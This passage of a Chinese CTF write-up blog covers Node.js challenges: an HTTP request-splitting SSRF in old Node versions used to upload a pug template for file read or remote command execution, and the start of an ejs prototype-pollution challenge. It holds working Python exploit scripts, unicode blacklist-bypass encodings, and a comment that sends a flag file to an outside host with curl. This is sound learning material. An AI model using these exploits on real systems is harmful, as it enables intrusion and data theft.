                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                         res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"search param 'q' missing!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> evilwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span><span class="token string">"mainModule"</span><span class="token punctuation">,</span><span class="token string">"require"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"child_process"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"!"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> arrayLen <span class="token operator">=</span> evilwords<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> trigger <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>evilwords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8081</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> host <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address
    <span class="token keyword">var</span> port <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>port
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Example app listening at http://%s:%s"</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<p>先看代码逻辑，<code>express</code>框架写的，路由交给<code>express</code>处理</p>
<p>根路由<code>/</code>，接收一个<code>action</code>参数，不允许出现<code>/</code>和<code>\\</code>（反斜杠），<code>path</code>拼接使用<code>pug</code> 引擎渲染模板到前端</p>
<p><code>/file_upload</code>，很明显文件上传，但是需要<code>ip.includes(&#39;127.0.0.1&#39;)</code>，<code>ip</code>由<code>req.connection.remoteAddress</code>获取，我们知道<code>remoteAddress</code>这种<code>http</code>是无法伪造的，所以必须得是本地请求才可以上传文件，可能涉及<code>SSRF</code>，<code>file_path</code>由<code>mimetype</code>直接拼接，未做任何校验，可以路径穿越上传任意文件，这里先放着</p>
<p><code>/source</code>，源码获取</p>
<p><code>/core</code>，接收一个<code>q</code>，访问本地8081端口的资源，放到<code>/source</code>后面，然后会显示访问的结果，这里估计就是<code>SSRF</code>的点了</p>
<p>逻辑分析完，根据题目提示，node版本，估计是node的洞，网上查了一下，这个版本的 Node 的 http 模块涉及一个拆分攻击漏洞，这个问题是由Node.js将HTTP请求写入路径时对unicode字符的有损编码引起的。</p>
<p>详见：<a href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p>
<p>于是我们可以构造恶意请求</p>
<p>原始请求头：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/source?q=x</span> <span class="token http-version property">HTTP/1.1</span></span></code></pre>

<p>插入文件上传请求头：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/source?q=x</span> <span class="token http-version property">HTTP/1.1</span></span>

<span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/file_upload</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:8081</span></span>

xxx文件内容</code></pre>

<p>文件内容根据<code>pug</code>引擎手册来写： <a href="https://pugjs.org/zh-cn/language/includes.html">https://pugjs.org/zh-cn/language/includes.html</a></p>
<p>读flag的话包含flag文件即可，格式如下</p>
<pre class="language-none"><code class="language-none">doctype html
html
  head
    style
      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</code></pre>

<p><code>Content-Type: /../template</code>，写pug到template目录下</p>
<p><code>Connection: Keep-Alive</code>，表明客户端想要保持该网络连接打开，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection">Connection</a></p>
<p>Exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> requests

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''x HTTP/1.1
Host: x
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: x
Content-Type: multipart/form-data; boundary=--------------------------123
Connection: keep-alive
cache-control: no-cache
Content-Length: 253

----------------------------123
Content-Disposition: form-data; name="file"; filename="extrader.pug"
Content-Type: ../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt

----------------------------123--

GET /flag HTTP/1.1
Host: x
Connection: close
x:'''</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0xff'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://8a307357-1cde-471d-b257-70794a7efa58.node4.buuoj.cn:81/core?q='</span> <span class="token operator">+</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://8a307357-1cde-471d-b257-70794a7efa58.node4.buuoj.cn:81/?action=extrader'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

<p>但如果我们想嵌入代码RCE呢？</p>
<p>还是根据文档来：<a href="https://pugjs.org/zh-cn/language/code.html">https://pugjs.org/zh-cn/language/code.html</a></p>
<pre class="language-none"><code class="language-none">- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;evalcmd&#39;)</code></pre>

<p>但是这里有个<code>blacklist</code></p>
<p>字符串拼接绕过：</p>
<pre class="language-none"><code class="language-none">- eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;whoami&#39;).toString()&quot;)</code></pre>

<p>对参数URL编码绕过：<a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-gamev">https://blog.5am3.com/2020/02/11/ctf-node1/#自己出的-node-gamev</a></p>
<p>Exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

payloadRaw <span class="token operator">=</span> <span class="token triple-quoted-string string">"""x HTTP/1.1

POST /file_upload HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
Content-Length: 6279
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/?action=upload
Upgrade-Insecure-Requests: 1

-----------------------------12837266501973088788260782942
Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"
Content-Type: ../template

- global.process.mainModule.require('child_process').execSync('evalcmd')
-----------------------------12837266501973088788260782942--


"""</span>

<span class="token keyword">def</span> <span class="token function">getParm</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"%C4%A0"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">"%C4%8D%C4%8A"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"%C4%A2"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"%C4%A7"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"%C5%A0"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"!"</span><span class="token punctuation">,</span><span class="token string">"%C4%A1"</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"%2B"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"%3B"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"%26"</span><span class="token punctuation">)</span>

    <span class="token comment"># Bypass Waf </span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"global"</span><span class="token punctuation">,</span><span class="token string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"process"</span><span class="token punctuation">,</span><span class="token string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"mainModule"</span><span class="token punctuation">,</span><span class="token string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"require"</span><span class="token punctuation">,</span><span class="token string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">,</span><span class="token string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payloadC <span class="token operator">=</span>  payloadRaw<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"evalcmd"</span><span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>
    urlC <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/core?q="</span><span class="token operator">+</span>getParm<span class="token punctuation">(</span>payloadC<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlC<span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/?action=5am3_get_flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    targetUrl <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    cmd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>targetUrl<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># python3 exp.py http://127.0.0.1:8081 "curl eval.com -X POST -d `cat /flag.txt`"</span></code></pre>

<h3 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h3><p>知识点：原型链污染，ejs模板引擎远程代码执行漏洞(CVE-2020-35772)</p>
<p>首页如下，访问<code>www.zip</code>可以得到一份代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210817142629288.png" alt loading="lazy"></p>
<p>目录结构如下（node_modules是我本地搭环境的时候npm install）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210817153740381.png" alt loading="lazy"></p>
<p>我们主要看到<code>index.js</code>代码</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">isObject</span> <span class="token operator">=</span> <span class="token parameter">obj</span> <span class="token operator">=></span> obj <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Object<span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> a
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span><span class="token parameter">keyword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>keyword<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(admin)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">is</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> keyword
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> <span class="token keyword">undefined</span>
<span class="token punctuation">&#125;</span>

router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  res<span class="token punctuation">.</span>outputFunctionName<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span> 
   <span class="token punctuation">&#125;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">&#123;</span>
      <span class="token string-property property">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token string-property property">'passwd'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>
      <span class="token string-property property">'isLogin'</span><span class="token operator">:</span><span class="token boolean">false</span>
    <span class="token punctuation">&#125;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  
  <span class="token punctuation">&#125;</span>
  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/action'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('ADMIN is asked');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> 
  req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('success');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'user'</span><span class="token operator">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre>

<p>这里涉及的CVE可以看 <a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">Express+lodash+ejs: 从原型链污染到RCE</a>，然后再来看这个代码就知道如何利用了</p>
